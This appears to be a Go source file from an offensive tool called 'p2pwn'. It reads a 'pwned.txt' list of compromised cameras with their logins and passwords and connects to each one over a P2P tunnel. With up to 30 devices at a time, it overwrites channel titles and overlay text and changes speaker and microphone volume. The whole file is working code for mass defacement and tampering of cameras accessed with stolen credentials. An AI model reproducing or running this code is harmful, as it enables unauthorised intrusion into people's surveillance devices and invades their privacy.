package core

import (
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/thebadinteger/p2pwn/core/p2p"
)

type PwnedEntry struct {
	Serial   string
	Login    string
	Password string
	Model    string
	Channels int
}

func parsePwnedTxt(path string) ([]PwnedEntry, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}

	var entries []PwnedEntry
	re := regexp.MustCompile(`\[([^\]]+)\] Credentials: ([^:]+):([^\|]+) \| S/N: ([^\|]+) \| Channels: (\d+)`)

	for _, line := range strings.Split(string(data), "\n") {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}

		matches := re.FindStringSubmatch(line)
		if matches == nil {
			continue
		}

		channels, _ := strconv.Atoi(matches[5])
		entries = append(entries, PwnedEntry{
			Model:    matches[1],
			Login:    matches[2],
			Password: matches[3],
			Serial:   matches[4],
			Channels: channels,
		})
	}

	return entries, nil
}

func Rebrand(outDir string, config *Config) {
	pwnedPath := filepath.Join(outDir, "pwned.txt")
	entries, err := parsePwnedTxt(pwnedPath)
	if err != nil {
		fmt.Printf("\x1b[91m[!] Cannot read pwned.txt: %v\x1b[0m\n", err)
		return
	}

	if len(entries) == 0 {
		fmt.Printf("\x1b[91m[!] No entries found in pwned.txt\x1b[0m\n")
		return
	}

	nowStr := time.Now().Format("15:04:05")
	fmt.Printf("\x1b[91m[%s] p2pwn rebrand\x1b[0m\n", nowStr)
	fmt.Printf("[found] > %d cameras\n", len(entries))
	fmt.Println()

	retries := 5
	if val, err := getIntValue(config.Scan.Retries); err == nil && val > retries {
		retries = val
	}

	var (
		mu           sync.Mutex
		wg           sync.WaitGroup
		successCount int
		failCount    int
	)

	sem := make(chan struct{}, 30)

	for i, entry := range entries {
		sem <- struct{}{}
		wg.Add(1)

		go func(idx int, e PwnedEntry) {
			defer wg.Done()
			defer func() { <-sem }()

			mu.Lock()
			current := idx + 1
			mu.Unlock()

			for attempt := 0; attempt < retries; attempt++ {
				if attempt > 0 {
					time.Sleep(time.Duration(attempt) * 1 * time.Second)
				}

				client := p2p.NewDHClient(e.Serial, false)
				client.SetRetries(3)

				if err := client.Handshake(); err != nil {
					client.Close()
					continue
				}

				if err := client.PTCPHandshake(); err != nil {
					client.Close()
					continue
				}

				directOK := true
				if err := client.EstablishDirectP2P(); err != nil {
					directOK = false
					if err := client.CompleteRelayHandshake(); err != nil {
						client.Close()
						continue
					}
				}

				stopHB := make(chan struct{})
				client.StartHeartbeat(stopHB)

				var tunnel *p2p.PTCPTunnel
				if directOK {
					tunnel = client.NewDirectTunnel()
				} else {
					tunnel = client.NewTunnel()
				}

				tunnel.SetAuth(e.Login, e.Password)

				// Try to get device info (model/channels)
				model := e.Model
				channels := e.Channels
				if m, c, _, err := tunnel.GetDeviceInfo(); err == nil && m != "" {
					model = m
					if c > 0 {
						channels = c
					}
				}

				// Update entry with fresh data
				currentEntry := e
				currentEntry.Model = model
				currentEntry.Channels = channels

				// Apply branding
				brandOK := true
				if config.Brand.Enabled {
					brandOK = applyBrandingToTunnel(tunnel, e.Serial, &currentEntry, config)
				}

				// Apply audio
				audioOK := true
				if config.Audio.Enabled {
					audioOK = applyAudioToTunnel(tunnel, config)
				}

				mu.Lock()
				if brandOK && audioOK {
					successCount++
					fmt.Printf("\x1b[32m[%d/%d] OK\x1b[0m %s\n", current, len(entries), e.Serial)
				} else if !brandOK && !audioOK {
					// Both failed - likely not connected properly
					failCount++
					fmt.Printf("\x1b[91m[%d/%d] FAIL\x1b[0m %s (brand+audio failed)\n", current, len(entries), e.Serial)
				} else {
					successCount++
					fmt.Printf("\x1b[33m[%d/%d] PARTIAL\x1b[0m %s (brand=%v audio=%v)\n", current, len(entries), e.Serial, brandOK, audioOK)
				}
				mu.Unlock()

				tunnel.Disconnect()
				close(stopHB)
				client.Close()
				return
			}

			mu.Lock()
			failCount++
			fmt.Printf("\x1b[91m[%d/%d] FAIL\x1b[0m %s (all retries exhausted)\n", current, len(entries), e.Serial)
			mu.Unlock()
		}(i, entry)
	}

	wg.Wait()

	fmt.Println()
	doneStr := time.Now().Format("15:04:05")
	fmt.Printf("\x1b[32m[%s] Done: %d ok, %d failed\x1b[0m\n", doneStr, successCount, failCount)
}

func applyBrandingToTunnel(tunnel *p2p.PTCPTunnel, serial string, entry *PwnedEntry, config *Config) bool {
	const maxRetries = 3
	const retryDelay = 300 * time.Millisecond

	replacePlaceholders := func(tmpl string) string {
		r := strings.ReplaceAll(tmpl, "{serial}", serial)
		r = strings.ReplaceAll(r, "{model}", entry.Model)
		return r
	}

	allOK := true

	if config.Brand.ChannelTitle != "" {
		title := replacePlaceholders(config.Brand.ChannelTitle)
		for ch := 0; ch < entry.Channels; ch++ {
			ok := false
			for attempt := 0; attempt < maxRetries; attempt++ {
				if err := tunnel.SetChannelTitle(ch, title); err == nil {
					ok = true
					break
				}
				time.Sleep(retryDelay)
			}
			if !ok {
				allOK = false
			}
		}
	}

	if len(config.Brand.OverlayText) > 0 {
		lines := make([]string, len(config.Brand.OverlayText))
		for i, line := range config.Brand.OverlayText {
			lines[i] = replacePlaceholders(line)
		}
		for ch := 0; ch < entry.Channels; ch++ {
			ok := false
			for attempt := 0; attempt < maxRetries; attempt++ {
				if err := tunnel.SetOverlayText(ch, lines); err == nil {
					ok = true
					break
				}
				time.Sleep(retryDelay)
			}
			if !ok {
				allOK = false
			}
		}
	}

	return allOK
}

func applyAudioToTunnel(tunnel *p2p.PTCPTunnel, config *Config) bool {
	const maxRetries = 3
	const retryDelay = 300 * time.Millisecond

	for attempt := 0; attempt < maxRetries; attempt++ {
		if err := tunnel.SetAudioVolume(config.Audio.SpeakerVolume, config.Audio.MicVolume); err == nil {
			return true
		}
		time.Sleep(retryDelay)
	}
	return false
}
